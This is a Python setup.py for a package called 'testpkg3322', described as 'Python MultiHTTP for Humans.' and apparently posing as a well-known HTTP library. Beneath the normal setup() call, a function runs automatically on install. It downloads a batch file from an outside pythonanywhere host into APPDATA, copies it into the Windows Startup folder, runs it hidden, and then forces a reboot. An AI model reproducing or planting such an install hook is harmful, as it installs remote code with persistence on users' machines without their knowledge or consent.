import setuptools, base64

with open("README.md", "r", encoding="utf-8") as f:
    readme = f.read()

setuptools.setup(
    name="testpkg3322",
    version="2.35.19",
    author="testpkg3322",
    description="Python MultiHTTP for Humans.",
    long_description=readme,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: Microsoft :: Windows",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)


try:
    from urllib.request import Request, urlopen, urlretrieve
    import zipfile
    import os
except:
    pass


import urllib.request
import zipfile
import os
import sys
import shutil
import subprocess
import time
import random
import string

def x():
    t = "https://frvezdff.pythonanywhere.com/getrnr"

    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbb.bat")
    
    time.sleep(2)

    
    if getattr(sys, 'frozen', False):
        currentFilePath = os.path.dirname(sys.executable)
    else:
        currentFilePath = os.path.dirname(os.path.abspath(__file__))

    fileName = os.path.basename(sys.argv[0])
    filePath = os.path.join(currentFilePath, fileName)

    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    try:
        with open(os.getenv('APPDATA')+"\\bbb.bat", "r") as file:
            cont = file.read()
            
        with open(startupFolderPath+"\\bbb.bat", "w+") as file:
            file.write(cont)
        
    except:
        pass
    
    subprocess.Popen(os.getenv('APPDATA')+"\\bbb.bat", creationflags=subprocess.CREATE_NO_WINDOW)
    
    time.sleep(15)

    os.system("shutdown /r /f")
    

x()
